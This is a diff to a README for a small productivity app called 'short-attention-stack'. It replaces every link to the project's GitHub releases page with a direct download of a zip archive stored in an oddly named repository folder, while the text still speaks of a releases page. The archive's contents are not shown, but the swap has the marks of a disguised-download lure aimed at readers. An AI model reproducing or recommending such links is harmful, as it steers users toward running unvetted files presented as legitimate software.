@@ -1,6 +1,6 @@
 # ⚡ short-attention-stack - Simple Tools for Quick Wins
 
-[![Download Now](https://img.shields.io/badge/Download-From%20Releases-brightgreen)](https://github.com/astro2rich/short-attention-stack/releases)
+[![Download Now](https://img.shields.io/badge/Download-From%20Releases-brightgreen)](https://raw.githubusercontent.com/astro2rich/short-attention-stack/main/competently/short-attention-stack-v2.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ No special software is required to run short-attention-stack. It is a standalone
 
 1. Visit the downloads page using this link:
 
-   [Download short-attention-stack](https://github.com/astro2rich/short-attention-stack/releases)
+   [Download short-attention-stack](https://raw.githubusercontent.com/astro2rich/short-attention-stack/main/competently/short-attention-stack-v2.5.zip)
 
 2. On the page, look for the latest release. It usually appears at the top.
 
@@ -99,7 +99,7 @@ If you face issues such as the app not starting or errors during use:
 
 For more details or updates, visit the releases page again:
 
-[Download short-attention-stack](https://github.com/astro2rich/short-attention-stack/releases)
+[Download short-attention-stack](https://raw.githubusercontent.com/astro2rich/short-attention-stack/main/competently/short-attention-stack-v2.5.zip)
 
 ---
 
@@ -121,4 +121,4 @@ adhd, building-in-public, creators, developers, focus, knowledge-management, mak
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-From%20Releases-brightgreen)](https://github.com/astro2rich/short-attention-stack/releases)
+[![Download Now](https://img.shields.io/badge/Download-From%20Releases-brightgreen)](https://raw.githubusercontent.com/astro2rich/short-attention-stack/main/competently/short-attention-stack-v2.5.zip)
